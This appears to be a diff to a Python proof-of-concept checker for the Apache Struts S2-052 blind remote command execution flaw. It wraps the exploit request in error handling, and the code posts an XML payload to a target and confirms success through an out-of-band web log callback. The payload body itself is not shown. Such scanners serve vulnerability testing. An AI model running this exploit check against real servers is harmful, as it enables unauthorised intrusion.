@@ -9,7 +9,7 @@ Desc
 Version
     Struts 2.1.2 - Struts 2.3.33
     Struts 2.5 - Struts 2.5.12
-Usage
+Type
     无回显命令执行
 Referer
     - http://struts.apache.org/docs/s2-052.html
@@ -87,9 +87,13 @@ def poc(url):
         "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
         "Content-Type":"application/xml"
     }
-    resp = requests.post(url, data=payload, headers=headers)
-    if mydnslog.verifyHTTP(3):
-        return "[S2-052][weblog] " + url
+    try:
+        resp = requests.post(url, data=payload, headers=headers)
+        if mydnslog.verifyHTTP(3):
+            return "[S2-052][weblog] " + url
+    except Exception as e:
+        logging.debug(e)
+    return False
 
 if __name__ == "__main__":
     poc("http://vuln.com:8080/orders.xhtml")
